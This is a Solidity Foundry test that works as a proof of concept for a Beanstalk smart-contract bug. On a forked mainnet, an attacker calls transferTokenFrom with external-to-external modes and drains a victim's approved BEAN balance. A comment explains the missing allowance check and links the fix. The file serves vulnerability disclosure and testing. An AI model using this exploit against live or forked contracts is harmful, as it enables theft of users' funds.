// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

// fix here: https://github.com/BeanstalkFarms/Beanstalk/pull/146/files
contract BeanStalkPoC is Test {
   IBEAN beanstalk = IBEAN(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
   IERC20 bean = IERC20(0xBEA0000029AD1c77D3d5D23Ba2D8893dB9d1Efab);

   address attacker;
   address victim;

   function setUp() public {
       vm.createSelectFork("mainnet", 15970150);
       attacker = makeAddr("attacker");
       victim = makeAddr("victim");
       deal(address(bean), victim, 10000e18);
   }

   function testPoC() public {
       vm.prank(victim);
       bean.approve(address(beanstalk),10000e18);

       console.log("ALLOWANCE FOR BEAN TOKENS: ",bean.allowance(victim,address(beanstalk)));
       uint256 victimBalBefore = bean.balanceOf(victim);
       uint256 attackerBalBefore = bean.balanceOf(attacker);

       vm.prank(attacker);
       beanstalk.transferTokenFrom(bean, // token
                                   victim, // sender
                                   attacker,  // recipient
                                   victimBalBefore, // amount 
                                   LibTransfer.From.EXTERNAL, // FromMode
                                   LibTransfer.To.EXTERNAL); // ToMode

       uint256 victimBalAfter = bean.balanceOf(victim);
       uint256 attackerBalAfter = bean.balanceOf(attacker);
       assertEq(attackerBalAfter, victimBalBefore);

       console.log("victim balBefore : ",victimBalBefore,", victim balAfter :",victimBalAfter);
       console.log("attacker balBefore: ",attackerBalBefore,", attacker balAfter :",attackerBalAfter);
   }
}

interface IBEAN {
    function transferTokenFrom(
        IERC20 token,
        address sender,
        address recipient,
        uint256 amount,
        LibTransfer.From fromMode,
        LibTransfer.To toMode) 
    external;
}

library LibTransfer {
   enum From {
       EXTERNAL,
       INTERNAL,
       EXTERNAL_INTERNAL,
       INTERNAL_TOLERANT
   }
   enum To {
       EXTERNAL,
       INTERNAL
   }
}
/*

    The vulnerability arises due to the fact that this function 
    only checks the allowance for the internal balance
    for the msg.sender, but not for external transfers.

    function transferTokenFrom(
       IERC20 token,
       address sender,
       address recipient,
       uint256 amount,
       LibTransfer.From fromMode, <-- this is removed in the fix
       LibTransfer.To toMode
   ) external payable nonReentrant {
       uint256 beforeAmount = LibBalance.getInternalBalance(sender, token);

       LibTransfer.transferToken(
           token,
           sender,
           recipient,
           amount,
           fromMode,
           toMode
       );

       // sender is the victim
       // msg.sender is the attacker

       if (sender != msg.sender) { 
           uint256 deltaAmount = beforeAmount.sub(
               LibBalance.getInternalBalance(sender, token)
           );
           if (deltaAmount > 0) {
               LibTokenApprove.spendAllowance(sender, msg.sender, token, deltaAmount);
           }
       }
   }

   LibTransfer.transferToken function definition:

     function transferToken(
        IERC20 token,
        address sender,
        address recipient,
        uint256 amount,
        From fromMode,
        To toMode
    ) internal returns (uint256 transferredAmount) {
        if (fromMode == From.EXTERNAL && toMode == To.EXTERNAL) {
            uint256 beforeBalance = token.balanceOf(recipient);
            token.safeTransferFrom(sender, recipient, amount);
            return token.balanceOf(recipient).sub(beforeBalance);
        }
        amount = receiveToken(token, amount, sender, fromMode);
        sendToken(token, amount, recipient, toMode);
        return amount;
    }

*/


interface IERC20 {
   event Transfer(address indexed from, address indexed to, uint256 value);
   event Approval(address indexed owner, address indexed spender, uint256 value);
   function totalSupply() external view returns (uint256);
   function balanceOf(address account) external view returns (uint256);
   function transfer(address to, uint256 amount) external returns (bool);
   function allowance(address owner, address spender) external view returns (uint256);
   function approve(address spender, uint256 amount) external returns (bool);
   function transferFrom(address from, address to, uint256 amount) external returns (bool);
}